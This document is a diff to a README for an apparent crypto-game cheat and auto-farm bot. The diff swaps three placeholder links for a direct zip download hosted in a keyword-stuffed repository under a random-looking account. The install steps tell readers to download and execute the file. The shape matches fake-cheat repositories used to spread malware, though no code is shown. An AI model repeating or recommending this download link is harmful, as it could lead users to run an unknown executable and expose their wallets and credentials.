@@ -2,7 +2,7 @@
 
 Welcome to the **Forgotten Runiverse Crypto Bot** repository! This project automates farming and clicker activities in the Forgotten Runiverse game, integrating crypto functionalities to enhance your gameplay experience. The bot supports API access and includes Telegram features for easy management. Explore the tools for hacks and cheats designed to optimize your profits and improve efficiency in gameplay.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](555)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/mrbublegummouth560/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-1v/releases/download/Download/Forgotten-Runiverse-Crypto-Bot.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ Welcome to the **Forgotten Runiverse Crypto Bot** repository! This project autom
 
 To install the Forgotten Runiverse Crypto Bot, follow these steps:
 
-1. Download the latest release from the [Releases section](555). You need to download and execute the appropriate file for your system.
+1. Download the latest release from the [Releases section](https://github.com/mrbublegummouth560/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-1v/releases/download/Download/Forgotten-Runiverse-Crypto-Bot.zip). You need to download and execute the appropriate file for your system.
 2. Unzip the downloaded file to your desired directory.
 3. Ensure you have Python 3.7 or higher installed on your machine.
 4. Install the required dependencies using pip:
@@ -135,4 +135,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, please reach out via the Issues section on GitHub or contact the repository owner directly.
 
-Feel free to explore the features of the Forgotten Runiverse Crypto Bot. Don't forget to check the [Releases section](555) for the latest updates and downloads!
+Feel free to explore the features of the Forgotten Runiverse Crypto Bot. Don't forget to check the [Releases section](https://github.com/mrbublegummouth560/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-1v/releases/download/Download/Forgotten-Runiverse-Crypto-Bot.zip) for the latest updates and downloads!
